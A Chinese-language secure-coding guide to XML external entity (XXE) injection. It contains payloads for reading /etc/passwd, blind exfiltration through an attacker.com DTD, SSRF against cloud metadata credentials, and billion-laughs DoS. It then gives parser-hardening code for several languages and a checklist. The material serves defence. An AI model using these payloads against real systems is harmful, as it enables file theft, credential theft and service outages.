# XML 外部实体注入 XXE (XML External Entity)

> 分类：注入类 | 风险：高 | CWE-611

## 1. 攻击原理

XML 解析器默认支持 DTD 与外部实体。攻击者在 XML 中声明实体指向本地文件、内网 URL 或远程服务，解析时即被读取/请求，造成**文件读取、SSRF、拒绝服务**。

现代风险点：SOAP 接口、Office 文档（docx/xlsx 内部是 XML）、SVG 上传、SAML 断言、RSS/OPML 导入、图片 EXIF。

## 2. 攻击示例

### 文件读取

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### 盲注外带（无回显）

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
```

`evil.dtd`：

```dtd
<!ENTITY send SYSTEM "http://attacker.com/?d=%file;">
```

### SSRF

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

### Billion Laughs（DoS）

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ...
]>
```

## 3. 影响

- 任意文件读取（配置、密钥、`/etc/passwd`）
- 内网探测与云元数据窃取（可获取临时凭证）
- 拒绝服务（实体膨胀）
- 结合文件上传可进一步 SSRF/读取

## 4. 防御措施

1. **禁用 DTD 与外部实体**（根本手段）：
   - Java：`DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`，并关闭 `external-general-entities`、`external-parameter-entities`、`load-external-dtd`。
   - Python：`lxml` 使用 `XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)`；`defusedxml` 替代标准库。
   - PHP：`libxml_disable_entity_loader(true)`（PHP 8 默认安全）。
   - Node：`libxmljs` 关闭 `noent`；避免 `xml2js` 处理不可信 XML。
   - .NET：`XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit, XmlResolver = null }`。
2. **优先使用 JSON**：不需要 XML 就不要暴露 XML 接口。
3. **限制请求大小与解析深度**：防实体膨胀。
4. **上传文件二次处理**：SVG 净化、Office 文档用安全库解析并禁用外部资源。
5. **网络隔离**：解析服务默认拒绝出网，禁止访问云元数据地址（IMDSv2）。
6. **升级解析库**：及时修补已知 XXE 绕过。

## 5. 代码对比

```java
// ✅ Java 安全解析
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
Document doc = dbf.newDocumentBuilder().parse(inputStream);
```

```python
# ✅ Python defusedxml
from defusedxml import ElementTree as ET
root = ET.fromstring(untrusted_xml)
```

```csharp
// ✅ .NET
var settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null,
    MaxCharactersFromEntities = 1024
};
```

## 6. 自查清单

- [ ] 所有 XML 解析器已禁用 DOCTYPE / 外部实体
- [ ] 无 XML 需求的接口改为 JSON
- [ ] SVG / Office 上传做了净化或安全解析
- [ ] 解析服务网络出站受限，云元数据不可达
- [ ] 请求体大小与解析深度有限制
- [ ] 解析库版本无已知 XXE 漏洞

## 7. 参考资料

- OWASP: XML External Entity Prevention Cheat Sheet
- CWE-611: Improper Restriction of XML External Entity Reference
- PortSwigger: XXE injection
